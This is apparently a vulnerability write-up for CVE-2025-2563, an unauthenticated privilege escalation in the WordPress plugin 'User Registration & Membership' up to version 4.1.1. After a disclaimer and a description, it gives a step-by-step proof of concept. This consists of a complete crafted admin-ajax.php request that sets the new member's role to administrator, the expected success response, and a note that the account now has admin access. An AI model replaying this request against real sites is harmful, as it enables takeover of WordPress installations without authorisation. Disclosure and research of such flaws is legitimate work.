# CVE-2025-2563
###### User Registration & Membership <= 4.1.1 - Unauthenticated Privilege Escalation

### Disclaimer!
The information presented in this CVE (Common Vulnerabilities and Exposures) writeup is for educational and informational purposes only. The details provided are based on publicly available resources, research, and analysis conducted by the author. The content is not intended to promote or encourage any illegal activities, including hacking, exploitation, or unauthorized access to systems.

The author does not assume any responsibility for any misuse of the information presented. It is recommended that individuals and organizations apply this knowledge responsibly and in compliance with applicable laws and regulations. Readers are strongly advised to test vulnerabilities only in controlled environments with proper authorization.

The author and contributors of this writeup do not endorse or support malicious activities and encourage responsible disclosure and ethical hacking practices.

---

### Description
A critical security vulnerability has been discovered in the “User Registration & Membership” WordPress plugin, a popular tool for creating membership websites and registration forms. The flaw, identified as CVE-2025-2563, carries a CVSS score of 9.8, indicating its high severity.

The User Registration & Membership plugin for WordPress is vulnerable to privilege escalation in versions up to, and including, 4.1.1. This is due to insufficient restrictions on role type in the 'prepare_members_data()' function. This makes it possible for unauthenticated attackers to create new user accounts with the 'administrator'' role, with this conditions:
1. **The plugin has activated membership add-on**
2. **Registered user is no need confirmation**

---

### PoC (Proof Of Concept)

1. Register via frontend page at /registration or /membership-registration
2. After registered, use this request data.
    ```text
    POST /wp-admin/admin-ajax.php HTTP/1.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
    Accept: */*
    Host: hackthebox.test
    Accept-Encoding: gzip, deflate, br
    Connection: keep-alive
    Content-Type: multipart/form-data; boundary=--------------------------189123966817005614765335
    
    ----------------------------189123966817005614765335
    Content-Disposition: form-data; name="action"
    
    user_registration_membership_register_member
    ----------------------------189123966817005614765335
    Content-Disposition: form-data; name="security"
    
    THE_NONCE_HERE
    ----------------------------189123966817005614765335
    Content-Disposition: form-data; name="members_data"
    
    {"membership":"MEMBERSHIP_ID","payment_method":"free","start_date":"2025-3-29","username":"REGISTERED_USERNAME","role":"administrator"}
    ----------------------------189123966817005614765335--
   ```
3. The response must be like this  
    ```json
    {
        "success": true,
        "data": {
            "member_id": 24,
            "transaction_id": "",
            "message": "New member has been successfully created."
        }
    }  
    ```
4. Now you can log-in the registered account with administrator privilege.

---

### Reference
> 1. https://plugins.trac.wordpress.org/browser/user-registration/tags/4.1.2/modules/membership/includes/Admin/Services/MembersService.php?rev=3259656#L106
> 2. https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/user-registration/user-registration-membership-411-unauthenticated-privilege-escalation
> 3. https://securityonline.info/wordpress-plugin-cve-2025-2563-scores-9-8-threatens-thousands-of-membership-sites/

---

### Thank you

- https://saweria.co/ubaii
- https://buymeacoffee.com/ubaii
- https://trakteer.id/ubaii
